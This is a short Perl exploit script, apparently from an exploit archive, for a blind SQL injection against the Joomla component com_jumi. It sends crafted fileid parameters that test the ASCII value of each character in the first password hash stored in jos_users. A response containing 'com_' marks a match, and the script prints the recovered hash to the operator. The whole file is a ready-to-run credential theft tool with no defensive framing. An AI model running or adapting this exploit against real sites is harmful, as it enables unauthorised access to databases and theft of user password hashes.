#!/usr/bin/perl -w

use LWP::UserAgent;


print "\t\t-------------------------------------------------------------\n\n";
print "\t\t                      |  Chip d3 Bi0s |                       \n\n";
print "\t\t Joomla Component com_jumi (fileid) Blind SQL-injection        \n\n";
print "\t\t-----------------------------------------------------------------\n\n";




print "http://wwww.host.org/Path: ";
chomp(my $target=<STDIN>);
print " [-] Introduce fileid: ";
chomp($z=<STDIN>);

print " [+] Password: ";

$column_name="concat(password)";
$table_name="jos_users";


$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');


for ($x=1;$x<=32;$x++) #x limit referido a la posicion del caracter
{            #c referido a ascci 48-57, 97-102
 



  for ($c=48;$c<=57;$c++) 

{
 $host = $target . "/index.php?option=com_jumi&fileid=".$z."'+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+limit+0,1),".$x.",1))=".$c."/*";
 my $res = $b->request(HTTP::Request->new(GET=>$host));
 my $content = $res->content;
 my $regexp = "com_";
# print "limit:";
# print "$x";
# print "; assci:";
# print "$c;";
 if ($content =~ /$regexp/) {$char=chr($c); print "$char";}
 }





for ($c=97;$c<=102;$c++) 
{


 
 $host = $target . "/index.php?option=com_jumi&fileid=".$z."'+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+limit+0,1),".$x.",1))=".$c."/*";
 my $res = $b->request(HTTP::Request->new(GET=>$host));
 my $content = $res->content;
 my $regexp = "com_";
# print "limit:";
# print "$x";
# print "; assci:";
# print "$c;";
 if ($content =~ /$regexp/) {$char=chr($c); print "$char";}
 }
 

}
